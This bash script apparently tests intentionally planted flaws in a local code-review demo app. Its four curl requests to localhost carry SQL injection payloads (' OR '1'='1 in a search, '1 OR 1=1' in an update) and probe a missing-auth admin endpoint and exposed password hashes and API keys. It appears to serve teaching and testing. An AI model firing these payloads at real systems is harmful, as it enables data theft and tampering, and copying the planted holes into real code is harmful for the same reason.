#!/bin/bash
# Test Vulnerabilities Script for Linux/Mac
# This script tests all intentional vulnerabilities in the demo

echo ""
echo "=== Multi-Agent Code Review Demo - Vulnerability Tests ==="
echo "Make sure the server is running (npm start) before running these tests"
echo ""

# Test 1: SQL Injection
echo "[1/4] Testing SQL Injection Vulnerability..."
echo "Expected: Returns ALL users (bypassing username filter)"
echo ""
curl "http://localhost:3000/api/users/search?username=' OR '1'='1"
echo ""
echo "✓ If you see multiple users with password_hash fields, SQL injection works!"
echo ""

# Test 2: Missing Authentication
echo "[2/4] Testing Missing Authentication..."
echo "Expected: Admin endpoint accessible without Bearer token"
echo ""
curl "http://localhost:3000/api/users/admin/getAllUsers"
echo ""
echo "✓ If you see users without providing auth header, vulnerability confirmed!"
echo ""

# Test 3: Data Exposure
echo "[3/4] Testing Sensitive Data Exposure..."
echo "Expected: Response includes password_hash and api_key fields"
echo ""
curl "http://localhost:3000/api/users/list"
echo ""
echo "✓ If you see password_hash and api_key in the response, data exposure confirmed!"
echo ""

# Test 4: SQL Injection in UPDATE
echo "[4/4] Testing SQL Injection in UPDATE endpoint..."
echo "Expected: Updates multiple users (not just one)"
echo ""
curl -X POST "http://localhost:3000/api/users/update" \
  -H "Content-Type: application/json" \
  -d '{"userId": "1 OR 1=1", "email": "pwned@hack.com"}'
echo ""
echo "✓ If changed count > 1, SQL injection in UPDATE confirmed!"
echo ""

echo "=== All Vulnerability Tests Complete ==="
echo ""
echo "These vulnerabilities are INTENTIONAL for demo purposes."
echo "See src/middleware/auth.js for proper implementations."
echo ""
